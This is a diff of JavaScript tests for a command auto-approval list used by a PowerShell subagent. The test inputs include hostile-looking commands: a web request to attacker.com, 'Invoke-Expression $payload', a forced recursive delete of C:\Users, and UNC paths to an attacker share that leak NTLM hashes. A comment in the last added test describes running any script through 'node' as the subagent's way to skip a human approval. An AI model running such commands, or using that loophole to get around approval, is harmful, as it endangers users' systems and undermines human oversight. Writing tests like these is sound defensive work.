@@ -82,6 +82,51 @@ test("名外的命令拒绝", () => {
   }
 });
 
+test("Windows 只读 cmdlet 放行 —— 子代理在这台机器上跑的就是 PowerShell", () => {
+  for (const cmd of [
+    "Get-Content witness.txt",
+    "get-childitem",
+    "Test-Path answer.txt",
+    "Get-Item x.txt",
+    "Select-String -Path a.txt -Pattern foo",
+    "Get-FileHash a.txt",
+  ]) {
+    assert.equal(autoApprove(cmd).approved, true, cmd);
+  }
+});
+
+test("写操作与联网的 cmdlet 不在名单里", () => {
+  for (const cmd of [
+    "Set-Content x.txt -Value y",
+    "Add-Content x.txt -Value y",
+    "Remove-Item -Recurse -Force C:\\Users",
+    "Move-Item a.txt b.txt",
+    "Start-Process calc",
+    "Invoke-WebRequest http://attacker.com",
+    "Invoke-Expression $payload",
+  ]) {
+    assert.equal(autoApprove(cmd).approved, false, cmd);
+  }
+});
+
+test("参数里的 UNC 路径拒绝 —— 解析时会泄漏 NTLM 哈希", () => {
+  // 首个词是放行的 type / Get-Content,危险的是参数;只看命令名的规则看不见它。
+  for (const cmd of ["type \\\\attacker\\share\\x", "Get-Content \\\\attacker\\share\\x"]) {
+    assert.equal(autoApprove(cmd).approved, false, cmd);
+  }
+});
+
+test("预放行只看第一个词 —— node 后面跟什么路径都不影响判断", () => {
+  // 这是给子代理准备的出口:把计算写成脚本再 node 运行,省掉一次人工批准。
+  assert.equal(autoApprove("node reverse.mjs").approved, true);
+  assert.equal(autoApprove("node .\\reverse.mjs").approved, true);
+  assert.equal(autoApprove("node D:\\agent-test\\reverse.mjs").approved, true);
+  // 第一个词本身带路径时才拒绝 —— 防的是「换个同名程序顶包」,不是防参数。
+  // 这条边界要说清楚,否则很容易以为 node 后面的路径也被检查了。
+  assert.equal(autoApprove(".\\node x.mjs").approved, false);
+  assert.equal(autoApprove("C:\\evil\\node.exe x.mjs").approved, false);
+});
+
 test("空命令拒绝,且给出原因", () => {
   assert.equal(autoApprove("").approved, false);
   assert.equal(autoApprove("   ").approved, false);
